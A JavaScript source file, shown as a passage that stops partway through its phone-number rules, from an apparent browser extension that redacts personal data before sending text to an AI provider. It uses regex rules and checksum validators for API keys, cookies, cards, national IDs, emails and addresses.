// pii-filter.js
//
// Local, offline redaction of personal / sensitive data. Applied in
// background.js to everything that is about to leave the browser (question,
// page text, attachments, history, and therefore web-research queries) so the
// AI provider only ever sees placeholders such as [EMAIL] or [CREDIT_CARD].
//
// Pattern based: it reliably catches structured data (keys, tokens, cards,
// emails, phones, IDs). Names are only caught when they follow a clear cue
// (e.g. "Name:", "My name is", "Dear", "姓名", "我叫", email display names).
// It is a safety net, not a guarantee.
//
// Two deliberate exceptions (both needed for search / answers to work):
//   - A fact-check request goes out UNFILTERED: redacting the claim makes it
//     unsearchable and unanswerable (background.js skips question + selectedText).
//   - A web search the user EXPLICITLY asked for ("search the web ...") carries
//     real names (restoreNamePlaceholders): a search for a public fact is
//     useless with the name blinded. An AUTOMATIC lookup never does - it is
//     skipped when the question holds a name placeholder. Every other field,
//     and every other kind of PII, stays redacted.

import { parseIPv6 } from "../url-safety.js";

import { PII_FILTER_STORAGE_KEY } from "../storage-keys.js";

export { PII_FILTER_STORAGE_KEY };

// Luhn check, iterated RIGHT to left with the doubling starting at the second
// digit from the right - the standard direction. The previous left-to-right
// loop with the first digit undoubled is only equivalent for ODD lengths: for
// 14/16/18-digit cards (16 is the mainstream Visa/Mastercard/Discover/JCB/
// UnionPay length) every doubling position was shifted by one, ~90% of valid
// cards failed the check and leaked in plaintext. Odd lengths (13/15/17/19 and
// the 9-digit SIN) keep identical results under both directions.
function luhnValid(digits) {
  let sum = 0;
  let dbl = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let d = digits.charCodeAt(i) - 48;
    if (dbl) { d *= 2; if (d > 9) d -= 9; }
    sum += d;
    dbl = !dbl;
  }
  return sum % 10 === 0;
}

// Verhoeff check (Indian Aadhaar). Tables: d = mutation, p = permutation
// (8 rows, indexed i % 8); valid when the final c is 0.
const VERHOEFF_D = [
  [0,1,2,3,4,5,6,7,8,9],[1,2,3,4,0,5,6,7,8,9],[2,3,4,0,1,5,6,7,8,9],[3,4,0,1,2,5,6,7,8,9],
  [4,0,1,2,3,5,6,7,8,9],[5,6,7,8,9,0,1,2,3,4],[6,7,8,9,0,1,2,3,4,5],[7,8,9,0,1,2,3,4,5,6],
  [8,9,0,1,2,3,4,5,6,7],[9,0,1,2,3,4,5,6,7,8],
];
const VERHOEFF_P = [
  [0,1,2,3,4,5,6,7,8,9],[1,5,7,6,2,8,3,0,9,4],[5,8,0,3,7,9,6,1,4,2],[8,9,1,6,0,4,3,5,2,7],
  [9,4,5,3,1,2,6,8,7,0],[4,2,8,6,5,7,3,9,0,1],[2,7,9,3,8,0,6,4,1,5],[7,0,4,6,9,1,3,2,5,8],
];
function verhoeffValid(digits) {
  let c = 0;
  const rev = [...digits].reverse();
  for (let i = 0; i < rev.length; i++) c = VERHOEFF_D[c][VERHOEFF_P[i % 8][Number(rev[i])]];
  return c === 0;
}

// Taiwan national ID: one regional letter (two-digit code below) + 9 digits,
// weighted checksum 1,9,8,7,6,5,4,3,2,1,1 over the resulting 11 digits.
const TW_ID_LETTER_CODE = { A:10,B:11,C:12,D:13,E:14,F:15,G:16,H:17,I:34,J:18,K:19,L:20,M:21,N:22,O:35,P:23,Q:24,R:25,S:26,T:27,U:28,V:29,W:32,X:30,Y:31,Z:33 };
function twIdValid(id) {
  const code = TW_ID_LETTER_CODE[id[0]];
  if (code === undefined) return false;
  const digits = String(code) + id.slice(1);
  const weights = [1,9,8,7,6,5,4,3,2,1,1];
  let sum = 0;
  for (let i = 0; i < 11; i++) sum += Number(digits[i]) * weights[i];
  return sum % 10 === 0;
}

// Spanish DNI/NIE: 8 digits (NIE: X/Y/Z stand for 0/1/2 followed by 7 digits)
// plus the letter of "TRWAGMYFPDXBNJZSQVHLCKE" at number % 23.
const DNI_LETTERS = "TRWAGMYFPDXBNJZSQVHLCKE";
function dniValid(body, letter) {
  const n = Number(body.replace(/[XYZ]/, (ch) => String("XYZ".indexOf(ch))));
  return Number.isSafeInteger(n) && DNI_LETTERS[n % 23] === letter.toUpperCase();
}

// Japanese My Number: 12 digits, check digit = 0 when r <= 1 else 11 - r,
// where r = (first 11 digits x weights 6,5,4,3,2,7,6,5,4,3,2) mod 11.
function myNumberValid(digits) {
  const P = [6,5,4,3,2,7,6,5,4,3,2];
  let sum = 0;
  for (let i = 0; i < 11; i++) sum += Number(digits[i]) * P[i];
  const r = sum % 11;
  const check = r <= 1 ? 0 : 11 - r;
  return check === Number(digits[11]);
}

// French NIR: 15 digits (sex 1/2, year, month 01-12/20/62/63, ...) whose last
// two digits are the key 97 - (first 13 as a number) mod 97.
function nirValid(digits) {
  if (!/^[12]\d{14}$/.test(digits)) return false;
  if (!/^(?:0[1-9]|1[0-2]|20|62|63)/.test(digits.slice(3, 5))) return false;
  const key = 97n - (BigInt(digits.slice(0, 13)) % 97n);
  return Number(key) === Number(digits.slice(13));
}

const NAME_WORD = "[A-Z][a-zA-Z'’-]{1,24}";
const NAME_SEQ = `${NAME_WORD}(?:\\s+${NAME_WORD}){0,3}`;
// Greetings ("Hello World", "Hi Everyone", "Dear Customer Support Team") are
// followed by a capitalised word far more often than by a person's name. Only
// one or two capitalised words are taken, and a group word is left alone.
const NAME_SEQ_SHORT = `${NAME_WORD}(?:\\s+${NAME_WORD})?`;
const GENERIC_GREETING_TARGETS = new Set([
  "all", "everyone", "everybody", "there", "world", "team", "folks", "guys", "friends", "sir", "madam",
  "customer", "customers", "support", "user", "users", "admin", "administrator", "developer", "developers",
  "colleagues", "students", "reader", "readers", "hiring", "recruiter", "service", "sales", "help",
  // Famous brand / product / assistant names: "Hi Google" addresses a company,
  // not a person. Bounded to household names on purpose.
  "google", "microsoft", "apple", "amazon", "meta", "facebook", "instagram", "whatsapp", "netflix",
  "openai", "chatgpt", "gemini", "claude", "copilot", "alexa", "siri", "bing", "github", "stackoverflow",
  "reddit", "youtube", "linkedin", "tiktok", "spotify", "slack", "zoom", "linux", "ubuntu", "android",
  "iphone", "wikipedia",
]);
const isGenericTarget = (word) => GENERIC_GREETING_TARGETS.has(String(word).toLowerCase());
// Date of birth: only the date right after a birth label is redacted (the label
// stays, so the model still sees "Date of birth: [DATE_OF_BIRTH]"). A bare date
// is never touched - without the label it is usually an ordinary date.
const DOB_MONTH = "(?:jan(?:uary)?|feb(?:ruary)?|mar(?:ch)?|apr(?:il)?|may|june?|july?|aug(?:ust)?|sep(?:t(?:ember)?)?|oct(?:ober)?|nov(?:ember)?|dec(?:ember)?)";
const DOB_DATE = [
  "\\d{4}[-/.]\\d{1,2}[-/.]\\d{1,2}", // 1985-03-12, 1985/03/12, 1985.03.12
  "\\d{1,2}[-/.]\\d{1,2}[-/.]\\d{2,4}", // 03/12/1985, 12-03-1985
  `${DOB_MONTH}\\.?\\s+\\d{1,2}(?:st|nd|rd|th)?,?\\s+\\d{4}`, // March 12, 1985
  `\\d{1,2}(?:st|nd|rd|th)?\\s+(?:of\\s+)?${DOB_MONTH}\\.?,?\\s+\\d{4}`, // 12 March 1985
  "\\d{4}\\s?年\\s?\\d{1,2}\\s?月(?:\\s?\\d{1,2}\\s?[日号])?", // 1985年3月12日
].join("|");
// \b only guards the English labels: the Chinese ones sit next to other Chinese
// characters, where \b never matches.
const DOB_LABEL = "(?:\\b(?:date[\\s_-]*of[\\s_-]*birth|birth[\\s_-]*date|birthday|d\\.?o\\.?b|born(?:\\s+on)?)\\b\\.?|出生日期|出生年月日|出生年月|出生时间|生日|出生于|出生)";
// Common Chinese surnames: "<surname>先生/女士/老师..." is a name, "产品经理" is not.
const CN_SURNAMES = "王李张刘陈杨黄赵吴周徐孙马朱胡郭何高林罗郑梁谢宋唐许韩冯邓曹彭曾萧田董袁潘于蒋蔡余杜叶程苏魏吕丁任沈姚卢姜崔钟谭陆汪范金石廖贾夏韦付方白邹孟熊秦邱江尹薛闫段雷侯龙史陶黎贺顾毛郝龚邵万钱严覃武戴莫孔向汤";


// ---------- helpers for the rules below ----------

// Words that make a capitalised sequence a role / mailbox / group rather than a
// person ("Customer Support Team <help@x.com>", "Contact: Support Team").
const GENERIC_NAME_WORDS = new Set([
  "support", "team", "service", "services", "sales", "help", "helpdesk", "desk", "admin", "administrator",
  "info", "billing", "customer", "customers", "noreply", "no-reply", "notifications", "notification",
  "department", "dept", "office", "staff", "hr", "marketing", "accounts", "account", "security", "press",
  "newsletter", "updates", "system", "robot", "bot", "group", "committee", "company", "inc", "ltd", "llc",
  // Organization suffixes ("Client: Acme Corp") and technology words
  // ("Name: Python") introduce a company or a product, not a person.
  "corp", "corporation", "gmbh", "co",
  "python", "java", "javascript", "typescript", "ruby", "rust", "golang", "swift", "kotlin", "perl", "php",
  "linux", "unix", "windows", "macos", "android", "docker", "kubernetes", "terraform", "react", "vue",
  "angular", "node", "html", "css", "sql", "mongodb", "postgresql", "mysql", "sqlite", "redis",
]);
// Famous "title + word" phrases that are brands or films, not people. Checked
// on the FIRST word after the title only, and bounded on purpose: "Dr. Smith"
// must keep redacting.
const TITLE_BRAND_WORDS = new Set(["pepper", "who", "no"]);
// Words that precede a name in running text but are not part of it.
const NAME_LEAD_WORDS = new Set([
  "please", "contact", "email", "e-mail", "mail", "from", "to", "cc", "bcc", "send", "sent", "reply", "ask",
  "write", "attn", "attention", "regards", "thanks", "thank", "forward", "fwd", "re", "by", "via", "the",
]);
// Splits a matched capitalised sequence into [lead words kept as-is, name part]; the
// name part is null when it is generic (a role or group) or empty.
function splitNameSeq(seq) {
  const words = seq.split(/\s+/);
  let i = 0;
  while (i < words.length - 1 && NAME_LEAD_WORDS.has(words[i].toLowerCase())) i++;
  const rest = words.slice(i);
  if (!rest.length || rest.some((w) => GENERIC_NAME_WORDS.has(w.toLowerCase()) || NAME_LEAD_WORDS.has(w.toLowerCase()))) return null;
  return { lead: words.slice(0, i), name: rest.join(" ") };
}

// A "Name:" label that itself names a non-person thing ("Product Name:",
// "Brand Name:", "File Name:") introduces a value, not a person. When one of
// these words sits directly before the cue, the value stays. Person-plausible
// qualifiers ("Customer Name:", "User Name:") still redact.
const NON_PERSON_LABEL_RE = /(?:\b(?:product|brand|file|company|project|domain|host|server|variable|function|package|module|database|table|column|font|channel|sheet|workbook|app|application|bot|repo|repository|image|container|bucket|class|type|param|parameter|field|pet|network|printer|device|album|playlist|store|shop|item|article|post|page|site|website|blog|newsletter|dataset|schema|template|theme|folder|directory|archive|enum|struct|component|extension|plugin|script|service|endpoint|report|chart|graph|metric|event|session|build|release|version)\s+)$/i;
// The test above is anchored at the END of what it is given, and the longest
// qualifier word is 11 characters, so only the text right before the cue
// matters. It is therefore run on a short window, never on the whole prefix
// of the document: slicing and re-testing the full prefix for every "Name:"
// match made the rule quadratic in the number of matches (480k characters of
// "Name:" lines took ~6 s of synchronous time in the service worker). Same
// idea as the 14-character window of the IPv4 "Version 1.2.3.4" check.
const NON_PERSON_LABEL_WINDOW = 40;

// Is `value` (right after a key such as "password:" or "SECRET_KEY=") a secret,
// as opposed to ordinary text ("required", "4096", "<your key>")?
const NOT_A_SECRET_RE = /^(?:\[[A-Z_]+(?:#\d+)?\]|<[^>]*>|\$\{?[\w.:-]+\}?|%[\w.]+%|\{\{.*\}\}|x{3,}|\*{3,}|•+|\.{3,}|-{3,}|_{3,})$/i;
// Only a value made of letters / _ / - around such a word is a placeholder
// ("your_api_key_here"); a real-looking value that merely contains "example"
// (AWS's documented sample key) is still treated as a secret.
const PLACEHOLDER_WORD_RE = /^[a-z_-]*(?:your|example|placeholder|changeme|dummy|sample|redacted|masked|replace|insert|enter|todo|tbd)[a-z_-]*$/i;
const NOT_A_SECRET_WORDS = new Set([
  "required", "optional", "none", "null", "nil", "undefined", "true", "false", "yes", "no", "empty", "missing",
  "invalid", "incorrect", "wrong", "hidden", "masked", "unknown", "default", "string", "number", "text",
  "boolean", "object", "env", "enabled", "disabled", "expired", "valid", "set", "unset", "n/a", "na",
  "mandatory", "forgotten", "reset", "change", "changed", "protected", "secure", "strong", "weak", "length",
  "limit", "count", "type", "value", "key", "token", "password", "secret",
]);
const CJK_ONLY_RE = /^[぀-ヿ㐀-鿿가-힯]+$/;
function looksLikeSecret(raw, passwordLike) {
  const v = String(raw).trim();
  if (v.length < 4) return false;
  if (NOT_A_SECRET_RE.test(v) || PLACEHOLDER_WORD_RE.test(v)) return false;
  if (NOT_A_SECRET_WORDS.has(v.toLowerCase().replace(/[.,!]+$/, ""))) return false;
  if (CJK_ONLY_RE.test(v)) return false;
  if (passwordLike) return true; // a password-style label is strong evidence: any non-placeholder value
  const hasLetter = /[A-Za-z]/.test(v);
  const hasDigit = /\d/.test(v);
  if (v.length >= 8 && hasLetter && hasDigit) return true;
  if (v.length >= 20 && !/^[A-Za-z]+$/.test(v)) return true;
  if (v.length >= 32 && /^[A-Za-z0-9+/=_-]+$/.test(v)) return true;
  return false;
}

// key = value where the key NAME contains secret / token / password / api key ...
// (SECRET_KEY, AWS_SECRET_ACCESS_KEY, db_password, "X-Api-Key", client_secret).
// Whole-identifier match, so "tokenizer" and "max_tokens" are not keys.
const SECRET_KEY_NAME = String.raw`(?<![\w.-])[\w.-]*?(?:secret|token|passw(?:or)?d|pwd|passphrase|api[ _-]?key|private[ _-]?key|access[ _-]?key|credentials?)(?:[_-]?(?:access|key|value|string|id|hash|base)){0,3}(?![\w-])|密码|口令|密钥`;
const PASSWORD_LIKE_KEY_RE = /passw|pwd|passphrase|密码|口令/i;
// The bare-value class excludes & [ ] (like the URL-query rule below): without
// that, "?token=abc&page=2" swallowed the rest of the query string as one
// secret, hiding the harmless parameters from the model. It also stops at
// full-width CJK punctuation, so "密码：X，Y" redacts only X and the model
// still sees Y (real secrets are ASCII tokens; the surrounding prose is not).
const SECRET_KV_RE = new RegExp(`(${SECRET_KEY_NAME})(["']?\\s*[:=：]\\s*)(?:"([^"\\r\\n]{1,200})"|'([^'\\r\\n]{1,200})'|([^\\s"',;&\\[\\]，；、。：（）？！]+))`, "gi");
function redactSecretKeyValue(m, key, sep, dq, sq, bare) {
  const value = dq ?? sq ?? bare;
  if (value === undefined || !looksLikeSecret(value, PASSWORD_LIKE_KEY_RE.test(key))) return m;
  // A value that is/contains an earlier rule's numbered placeholder (the JWT
  // rule may already have produced "[JWT#1]") must never be re-redacted:
  // replacing it would destroy the placeholder, orphan its value mapping and
  // sever the placeholder→value restoration (the round-6 corruption class).
  if (/\[[A-Z_]+#\d+\]/.test(value)) return m;
  const q = dq !== undefined ? '"' : sq !== undefined ? "'" : "";
  return `${key}${sep}${q}[SECRET]${q}`;
}

// Session cookies and CSRF values are credentials too.
const COOKIE_NAME = String.raw`(?:PHPSESSID|JSESSIONID|ASP\.NET_SessionId|connect\.sid|session[_-]?id|sess[_-]?id|session[_-]?token|session|sid|csrf[_-]?token|csrftoken|xsrf[_-]?token|remember[_-]?(?:me|token)|__Host-[\w-]+|__Secure-[\w-]+)`;
const COOKIE_KV_RE = new RegExp(`((?<![\\w.-])${COOKIE_NAME}\\s*[=:]\\s*["']?)([A-Za-z0-9%._~+/=-]{8,})`, "gi");

// IPv6 (any text shape: full, ::-compressed, with an IPv4 tail or zone id).
const IPV6_CANDIDATE_RE = /(?<![\w:.])(?:[0-9A-Fa-f]{0,4}:){2,7}(?:[0-9A-Fa-f]{1,4}|(?:\d{1,3}\.){3}\d{1,3})?(?:%[\w.-]+)?(?![\w:]|\.\d)/g;
function redactIPv6(m) {
  if (m.length < 6) return m;
  const groups = parseIPv6(m.replace(/%.*$/, ""));
  if (!groups) return m; // "10:30:45", "std::string" ... are not addresses
  // A real address has a longer group (fe80, 2001, db8 ...) or many groups; this
  // keeps "12:30::" and similar time / scope-like text out.
  const written = m.replace(/%.*$/, "").split(":").filter(Boolean);
  if (!written.some((g) => g.length >= 3) && written.length < 5) return m;
  if (groups.slice(0, 7).every((g) => g === 0) && groups[7] <= 1) return m; // :: and ::1 identify nobody
  return "[IP_ADDRESS]";
}

// Phone numbers written with a cue word, in any digit grouping.
const PHONE_CUE = String.raw`(?:\b(?:phone|tel|telephone|mobile|cell(?:phone)?|fax|whatsapp|call\s+(?:me|us)(?:\s+(?:at|on))?|reach\s+(?:me|us)\s+(?:at|on)|(?:my|our)\s+(?:phone\s+|mobile\s+)?number\s+is)(?:\s*(?:number|no\.?|#))?|电话|手机号?|联系电话|联系方式)`;
const CUED_PHONE_RE = new RegExp(`(${PHONE_CUE}\\s*(?:[:=：]\\s*)?)(\\+?\\(?\\d[\\d ()\\-.]{7,18}\\d)(?![\\d])`, "gi");
function redactCuedPhone(m, cue, number) {
  const digits = number.replace(/\D/g, "");
  return digits.length >= 9 && digits.length <= 15 ? `${cue}[PHONE]` : m;
}
// A bare, strictly valid North American number (area code and exchange start
// with 2-9). Skipped when it sits next to an order / reference style label.
const NANP_CONTEXT_SKIP_RE = /(?:\b(?:order|invoice|ref|reference|tracking|account|acct|serial|sku|isbn|ticket|case|transaction|txn|confirmation|code|id|no)\b[^\n]{0,16}|#\s*)$/i;
function redactBareNanp(m, offset, whole) {
  return NANP_CONTEXT_SKIP_RE.test(whole.slice(Math.max(0, offset - 28), offset)) ? m : "[PHONE]";
}

// Street addresses: "123 Main Street, Springfield, IL 62704", "350 5th Ave Apt 4B".
const STREET_WORD = String.raw`(?:\d{1,3}(?:st|nd|rd|th)|[A-Z][\w'’.-]*)`;
const STREET_SUFFIX = "Street|St|Avenue|Ave|Road|Rd|Boulevard|Blvd|Lane|Ln|Drive|Dr|Court|Ct|Way|Place|Pl|Terrace|Ter|Highway|Hwy|Parkway|Pkwy|Square|Sq|Circle|Cir|Alley|Trail";
const CITY_WORDS = String.raw`[A-Z][A-Za-z.'’-]+(?:\s+[A-Z][A-Za-z.'’-]+){0,2}`;
const US_ADDRESS_RE = new RegExp(
  String.raw`\b\d{1,6}(?:-\d{1,6})?\s+(?:(?:N|S|E|W|NE|NW|SE|SW|North|South|East|West)\.?\s+)?(?:${STREET_WORD}\s+){1,3}(?:${STREET_SUFFIX})\b\.?` +
  String.raw`(?:,?\s+(?:Apt|Apartment|Suite|Ste|Unit|Floor|Fl)\.?\s*#?[\w-]+)?` +
  String.raw`(?:,\s*${CITY_WORDS},\s*[A-Z]{2}(?:\s+\d{5}(?:-\d{4})?)?)?`,
  "g"
);
const CN_ADDRESS_RE = /(?:[一-龥]{2,9}(?:省|自治区|特别行政区|市|区|县|镇|乡)){1,4}[一-龥\d]{0,12}?(?:路|街|大道|巷|弄|胡同)\d{1,5}(?:号|號)?(?:[一-龥\d-]{0,12}?(?:栋|幢|号楼|单元|室|楼|层|座))*/g;

// Each rule: [regex, replacement | function]. Order matters (specific first).
const RULES = [
  // --- secrets / keys ---
  [/-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?(?:-----END [A-Z ]*PRIVATE KEY-----|$)/g, "[PRIVATE_KEY]"],
  [/\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b/g, "[JWT]"],
  [/\b(?:AKIA|ASIA)[0-9A-Z]{16}\b/g, "[API_KEY]"],
  [/\bAIza[0-9A-Za-z_-]{35}\b/g, "[API_KEY]"],
  [/\bgh[pousr]_[A-Za-z0-9]{30,}\b/g, "[API_KEY]"],
  [/\bgithub_pat_[A-Za-z0-9_]{40,}\b/g, "[API_KEY]"],
  [/\bxox[abprs]-[A-Za-z0-9-]{10,}\b/g, "[API_KEY]"],
  [/\b(?:sk|pk|rk)_(?:live|test)_[A-Za-z0-9]{16,}\b/g, "[API_KEY]"],
  [/\bsk-(?:ant-|or-v1-|proj-)?[A-Za-z0-9_-]{20,}\b/g, "[API_KEY]"],
  [/\bgsk_[A-Za-z0-9]{20,}\b/g, "[API_KEY]"],
  [/\btvly-[A-Za-z0-9_-]{16,}\b/g, "[API_KEY]"],
  // Developer-platform tokens with a fixed prefix: HuggingFace (hf_), npm
  // (npm_), Replicate (r8_), GitLab (glpat-), Google OAuth access tokens
  // (ya29.; service accounts get ya29.c.<body>, hence the optional "c."), PyPI
  // (pypi-), xAI (xai-), Perplexity (pplx-), DigitalOcean (dop_v1_), Mailgun
  // (key- + 32 hex). Case-sensitive on purpose: the prefixes are lower-case.
  [/\b(?:hf|npm|r8)_[A-Za-z0-9]{30,}\b/g, "[API_KEY]"],
  [/\bglpat-[A-Za-z0-9_-]{20,}\b/g, "[API_KEY]"],
  [/\bya29\.(?:c\.)?[A-Za-z0-9_-]{30,}\b/g, "[API_KEY]"],
  [/\bpypi-[A-Za-z0-9_-]{40,}\b/g, "[API_KEY]"],
  [/\b(?:xai|pplx)-[A-Za-z0-9]{30,}\b/g, "[API_KEY]"],
  [/\bdop_v1_[a-f0-9]{64}\b/g, "[API_KEY]"],
  [/\bkey-[0-9a-f]{32}\b/g, "[API_KEY]"],
  // Service-specific credentials with canonical shapes: Slack and Discord
  // incoming-webhook URLs, a SendGrid API key, a Telegram bot token.
  [/https:\/\/hooks\.slack\.com\/services\/T[A-Za-z0-9]+\/B[A-Za-z0-9]+\/[A-Za-z0-9]+/g, "[API_KEY]"],
  [/https:\/\/discord(?:app)?\.com\/api(?:\/v\d+)?\/webhooks\/\d{5,25}\/[A-Za-z0-9_-]{20,}/g, "[API_KEY]"],
  [/\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b/g, "[API_KEY]"],
  [/\b\d{8,10}:[A-Za-z0-9_-]{35}\b/g, "[API_KEY]"],
  [/\b(Bearer|Basic)\s+[A-Za-z0-9._~+\/=-]{16,}/gi, "$1 [TOKEN]"],
  // Cookie headers carry session ids: the whole header value is a credential.
  // Skipped when the value already contains a numbered placeholder from an
  // earlier rule: blanking the whole header with an unnumbered [COOKIE] would
  // sever that placeholder's mapping (its value became unrecoverable) - the
  // earlier rule already redacted exactly the sensitive part.
  [/^([ \t]*(?:Set-)?Cookie2?[ \t]*:[ \t]*)(?!\[COOKIE)(?![^:\n]*\[[A-Z_]+(?:#\d+)?\])(\S.*)$/gim, (m, head, value) => (/^\[[A-Z_]+(?:#\d+)?\]$/.test(value.trim()) ? m : `${head}[COOKIE]`)],
  // Session cookie / CSRF values outside a Cookie header (sessionid=..., csrftoken=...).
  [COOKIE_KV_RE, (m, head, value) => (looksLikeSecret(value, false) ? `${head}[COOKIE]` : m)],
  // key = value where the key NAME contains secret / token / password / api key
  // (SECRET_KEY=..., AWS_SECRET_ACCESS_KEY=..., "password": "...") and the value
  // looks like a secret: "Password: required" and "max token: 4096" stay.
  [SECRET_KV_RE, redactSecretKeyValue],
  // secrets inside URL query strings. The value class also excludes brackets:
  // a value that is/contains an earlier rule's placeholder (e.g. "?token=[JWT#1]",
  // where the "#" would additionally truncate the match) must be left alone -
  // replacing part of it produced corrupted output like "[SECRET]#1]" and
  // broke the placeholder→value mapping.
  // The parameter name may carry a vendor prefix (X-Amz-Signature,
  // X-Amz-Security-Token, X-Amz-Credential, X-Goog-Signature, x-api-key): a
  // presigned URL's signature is a bearer credential for the object. The bare
  // names "key" and "auth" stay anchored right after ?/& - letting them take a
  // prefix too would also catch ordinary parameters such as "turkey=".
  [/([?&](?:[\w-]*?(?:api[_-]?key|token|sig|signature|secret|password|pwd|credential)|key|auth)=)[^&\s#\[\]]+/gi, "$1[SECRET]"],
  // user:pass@host
  [/(?<![a-z0-9+.-])([a-z][a-z0-9+.-]*:\/\/)[^\s\/:@]+:[^\s\/@]+@/gi, "$1[CREDENTIALS]@"],

  // --- contact ---
  // The lookbehind makes the scan linear: without it a long run of letters / dots
  // with no "@" (minified code, base64) is re-scanned from every position.
  // \p{L}/\p{N} cover accented and IDN addresses (josé@exämple.com) that the
  // ASCII-only class silently let through.
  [/(?<![\p{L}\p{N}._%+-])[\p{L}\p{N}._%+-]+@[\p{L}\p{N}.-]+\.\p{L}{2,}/gu, "[EMAIL]"],

  // --- crypto addresses ---
  // ETH/ERC-20 ("0x" + 40 hex) is distinctive enough on its own. Bitcoin
  // bech32 ("bc1...") likewise; legacy base58 uses the exact wallet alphabet
  // (no 0, O, I, l) and a 26-40 char window - a looser shape would eat
  // ordinary passwords and product keys.
  [/(?<![\w.])0x[a-fA-F0-9]{40}(?![\w.])/g, "[CRYPTO_ADDRESS]"],
  [/(?<![\w.])bc1[a-z0-9]{11,71}(?![\w])/g, "[CRYPTO_ADDRESS]"],
  [/(?<![\w.])[13][a-km-zA-HJ-NP-Z1-9]{25,39}(?![\w])/g, "[CRYPTO_ADDRESS]"],

  // --- government / financial ids ---
  [/(?<![\d])[1-9]\d{5}(?:19|20)\d{2}(?:0[1-9]|1[0-2])(?:0[1-9]|[12]\d|3[01])\d{3}[\dXx](?![\d])/g, "[ID_NUMBER]"],
  // French NIR (INSEE): 15 digits, sex 1/2, month 01-12/20/62/63, key = 97 - body mod 97.
  [/(?<![\d.])(?:[12]\d{14})(?!\d)/g, (m) => (nirValid(m) ? "[ID_NUMBER]" : m)],
  // UK National Insurance number: no checksum exists, so only the canonical
  // spaced written form (two letters, six digits, A-D suffix, restricted
  // letter sets) is matched - the solid form is too false-positive-prone.
  [/(?<![A-Za-z])[A-CEGHJ-PR-TW-Z][A-CEGHJ-NPR-TW-Z] \d{2} \d{2} \d{2} [A-D](?![A-Za-z0-9])/g, "[ID_NUMBER]"],
  // Taiwan national ID: regional letter + 9 digits + weighted checksum.
  [/(?<![A-Za-z0-9])[A-Z]\d{9}(?![A-Za-z0-9])/g, (m) => (twIdValid(m) ? "[ID_NUMBER]" : m)],
  // Spanish DNI (8 digits + letter) / NIE (X/Y/Z + 7 digits + letter), letter = number % 23.
  [/(?<![A-Za-z0-9])(?:[XYZ]\d{7}|\d{8})[- ]?[A-HJ-NP-TV-Za-hj-np-tv-z](?![A-Za-z0-9])/g, (m) => {
    const body = m.slice(0, -1).replace(/[- ]/g, "");
    return dniValid(body, m.at(-1)) && /\d{8}|[XYZ]\d{7}/.test(body) ? "[ID_NUMBER]" : m;
  }],
  // US SSN, dashed or space-grouped ("123-45-6789", "123 45 6789"). The SOLID
  // form is redacted only behind a cue ("SSN: 123456789", "Social Security
  // Number: ...") - an uncued solid 9-digit run is an order or reference
  // number far more often than an SSN, and it is exactly the SIN rule's shape.
  [/\b(?!000|666|9\d\d)\d{3}[- ](?!00)\d{2}[- ](?!0000)\d{4}\b/g, "[SSN]"],
  [/\b(?:SSN|social security(?: number)?)\s*[:：#-]?\s*(?!000|666|9\d\d)\d{3}(?!00)\d{2}(?!0000)\d{4}\b/gi, "[SSN]"],
  [/\b[A-Z]{2}\d{2}[ ]?(?:[A-Z0-9]{4}[ ]?){2,7}[A-Z0-9]{1,4}\b/g, (m) => (m.replace(/\s/g, "").length >= 15 ? "[IBAN]" : m)],
  // International numbers in the "00" dial-out form ("0049 171 1234567",
  // solid or grouped; the "+" form is the separate rule below). BEFORE the
  // card rule: the solid form has 11-15 digits and ~10% of those pass Luhn,
  // which would mislabel them as cards.
  [/(?<![\w+])00[1-9]\d{1,2}(?:[ -]?\d){7,10}(?!\d)/g, "[PHONE]"],
  // South Korean resident registration number ("900101-1234567"): a valid
  // birth date, a separator, then a century/gender digit 1-4 and six more.
  // Also before the card rule (13 digits, ~10% pass Luhn); the date and
  // gender checks keep ordinary date-prefixed numbers out.
  [/(?<![\d])\d{2}(?:0[1-9]|1[0-2])(?:0[1-9]|[12]\d|3[01])[- ][1-4]\d{6}(?!\d)/g, "[ID_NUMBER]"],
  // credit / debit cards: 13-19 digits, optional space/dash separators, Luhn-checked.
  // Runs BEFORE the 12-digit Aadhaar / My Number rules below: those shapes also
  // match the FIRST 12 digits of a grouped card ("4539 1488 0343" of
  // "4539 1488 0343 6467" passed the My Number check), which used to cut a
  // valid card into "[ID_NUMBER] + last 4" before the card rule ever saw it.
  // The ID rules themselves are unaffected - they are exactly 12 digits and the
  // card rule requires 13-19, so only genuine card-length runs reclassify.
  [/(?<![\w.])\d(?:[ -]?\d){12,18}(?![\w])/g, (m, offset, whole) => {
    // Digits directly after a "/" are a URL path segment ("/status/1580..."),
    // not a card - about 10% of random 13-19 digit numbers pass Luhn.
    if (offset > 0 && whole[offset - 1] === "/") return m;
    const d = m.replace(/[ -]/g, "");
    return d.length >= 13 && d.length <= 19 && luhnValid(d) ? "[CREDIT_CARD]" : m;
  }],
  // Indian Aadhaar: 12 digits (never starting 0/1), Verhoeff-checked. After the
  // card rule (see there): the shape also matches a grouped card's prefix.
  [/(?<![\w.])[2-9]\d{3}(?:[ -]?\d{4}){2}(?!\w)/g, (m) => (verhoeffValid(m.replace(/[ -]/g, "")) ? "[ID_NUMBER]" : m)],
  // Japanese My Number: 12 digits + official check digit (solid or 4-4-4).
  // After the card rule (see there), for the same prefix-match reason.
  [/(?<![\w.])(?:\d{4}[ -]?){2}\d{4}(?!\w)/g, (m) => (myNumberValid(m.replace(/[ -]/g, "")) ? "[ID_NUMBER]" : m)],
  // Passport number, only behind a cue ("Passport No. E12345678", "护照号
  // E12345678"): the shapes vary by country, so an uncued alphanumeric run
  // would over-mask ordinary reference codes.
  [/((?:\bpassport\s*(?:no\.?|number|#)?|护照号码|护照号)\s*[:：#]?\s*)([A-Z]{1,2}\d{6,9}\b)/gi, "$1[ID_NUMBER]"],
  [/((?:cvv|cvc|cid|security code|安全码)\s*[:=：#]?\s*)\d{3,4}\b/gi, "$1[CVV]"],
  // Canadian Business Number with its GST/HST program account ("123456789 RT0001").
  // Must run before the SIN rule so the 9-digit part is not handled on its own.
  [/(?<![\w.])\d{9}\s?RT\d{4}(?!\w)/gi, "[BUSINESS_NUMBER]"],
  
  // --- phone numbers (specific formats only, to avoid eating dates/ids) ---
  // With a cue word ("Phone:", "mobile", "call me at", "电话") any grouping of 9-15 digits.
  [CUED_PHONE_RE, redactCuedPhone],
  // North American with a country code, solid or grouped: +14155550132, 1-415-555-0132.
